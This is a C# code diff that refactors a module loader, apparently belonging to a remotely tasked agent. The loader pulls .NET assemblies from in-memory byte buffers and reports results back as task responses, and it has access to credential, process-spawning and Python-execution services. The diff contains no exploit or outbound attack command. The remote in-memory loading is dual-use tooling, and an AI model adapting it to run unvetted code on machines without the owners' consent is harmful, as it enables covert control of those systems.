@@ -11,19 +11,9 @@ namespace Workflow.Providers
     {
         private ConcurrentDictionary<string, IModule> loadedModules = new ConcurrentDictionary<string, IModule>();
         private AssemblyLoadContext loadContext = new AssemblyLoadContext(Misc.RandomString(10));
-        private ILogger logger { get; set; }
-        private IDataBroker messageManager { get; set; }
-        private IServiceConfig agentConfig { get; set; }
-        private ICredentialProvider tokenManager { get; set; }
-        private IRuntimeExecutor spawner { get; set; }
-        private IScriptEngine pythonManager { get; set; }
-        public ComponentProvider(IDataBroker messageManager, ILogger logger, IServiceConfig agentConfig, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager) {
-            this.logger = logger;
-            this.messageManager = messageManager;
-            this.agentConfig= agentConfig;
-            this.tokenManager = tokenManager;
-            this.spawner = spawner;
-            this.pythonManager = pythonManager;
+        private readonly PluginContext context;
+        public ComponentProvider(PluginContext context) {
+            this.context = context;
         }
         
         private bool TryLoadModule(string name, out IModule? plugOut)
@@ -32,7 +22,7 @@ namespace Workflow.Providers
             plugOut = null;
             try
             {
-                Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+                Assembly _tasksAsm = Assembly.Load(AssemblyNames.ForModule(name));
 
                 if(_tasksAsm is null)
                 {
@@ -60,7 +50,7 @@ namespace Workflow.Providers
             {
                 var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
                 DebugLog.Log($"LoadAssemblyAsync: success [{task_id}]");
-                messageManager.AddTaskResponse(new TaskResponse
+                context.MessageManager.AddTaskResponse(new TaskResponse
                 {
                     task_id = task_id,
                     user_output = "Loaded.",
@@ -71,7 +61,7 @@ namespace Workflow.Providers
             catch (Exception e)
             {
                 DebugLog.Log($"LoadAssemblyAsync: failed [{task_id}]: {e.Message}");
-                messageManager.AddTaskResponse(new TaskResponse
+                context.MessageManager.AddTaskResponse(new TaskResponse
                 {
                     task_id = task_id,
                     completed = true,
@@ -89,7 +79,7 @@ namespace Workflow.Providers
 
                 if (this.loadedModules.ContainsKey(moduleName))
                 {
-                    this.messageManager.AddTaskResponse(new LoadTaskResponse
+                    this.context.MessageManager.AddTaskResponse(new LoadTaskResponse
                     {
                         completed = true,
                         user_output = "Module already loaded.",
@@ -109,7 +99,7 @@ namespace Workflow.Providers
             catch (Exception e)
             {
                 DebugLog.Log($"LoadModuleAsync: failed {moduleName}: {e.Message}");
-                this.messageManager.AddTaskResponse(new LoadTaskResponse
+                this.context.MessageManager.AddTaskResponse(new LoadTaskResponse
                 {
                     completed = true,
                     task_id = task_id,
@@ -126,7 +116,8 @@ namespace Workflow.Providers
             {
                 if (typeof(IModule).IsAssignableFrom(t))
                 {
-                    IModule plug = (IModule)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager, spawner, pythonManager);
+                    IModule? plug = Activator.CreateInstance(t, context) as IModule;
+                    if (plug is null) continue;
                     this.loadedModules.GetOrAdd(plug.Name, plug);
                     DebugLog.Log($"ParseAssemblyForModule: found IModule type {t.Name} as {plug.Name}");
                     return true;
